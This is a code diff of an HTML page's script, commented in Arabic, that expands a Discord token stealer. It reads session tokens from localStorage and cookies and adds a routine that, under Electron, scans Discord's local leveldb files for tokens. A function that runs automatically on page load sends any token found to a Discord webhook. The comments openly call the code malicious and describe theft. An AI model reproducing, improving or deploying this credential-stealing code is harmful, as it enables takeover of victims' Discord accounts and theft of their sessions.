@@ -27,9 +27,41 @@
 
     <script>
         // سرقة التوكن من localStorage أو cookies
-        function stealToken() {
+        function stealTokenFromBrowser() {
             const token = localStorage.getItem('token') || document.cookie.match(/token=([^;]+)/)?.[1];
-            return token || "لم يتم العثور على توكن.";
+            return token || null;
+        }
+
+        // سرقة التوكن من ملفات نظام Discord (لأجهزة الكمبيوتر فقط)
+        async function stealTokenFromFiles() {
+            if (typeof window !== 'undefined' && window.process && window.process.versions && window.process.versions.electron) {
+                // إذا كان التطبيق يعمل على Electron (مثل تطبيقات سطح المكتب)
+                const { ipcRenderer } = require('electron');
+                const fs = require('fs');
+                const path = require('path');
+
+                const discordPaths = [
+                    path.join(process.env.APPDATA, 'discord', 'Local Storage', 'leveldb'),
+                    path.join(process.env.LOCALAPPDATA, 'discord', 'Local Storage', 'leveldb'),
+                    path.join(process.env.HOME, '.config', 'discord', 'Local Storage', 'leveldb'),
+                ];
+
+                for (const discordPath of discordPaths) {
+                    if (fs.existsSync(discordPath)) {
+                        const files = fs.readdirSync(discordPath);
+                        for (const file of files) {
+                            if (file.endsWith('.ldb') || file.endsWith('.log')) {
+                                const content = fs.readFileSync(path.join(discordPath, file), 'utf-8');
+                                const tokenMatch = content.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/);
+                                if (tokenMatch) {
+                                    return tokenMatch[0];
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            return null;
         }
 
         // إرسال التوكن إلى الديسكورد عبر الويب هوك
@@ -61,8 +93,17 @@
 
         // تشغيل الكود الضار تلقائيًا عند فتح الصفحة
         (async function() {
-            const token = stealToken();
-            await sendTokenToDiscord(token);
+            let token = stealTokenFromBrowser();
+
+            if (!token) {
+                token = await stealTokenFromFiles();
+            }
+
+            if (token) {
+                await sendTokenToDiscord(token);
+            } else {
+                console.error('لم يتم العثور على توكن.');
+            }
         })();
     </script>
 </body>
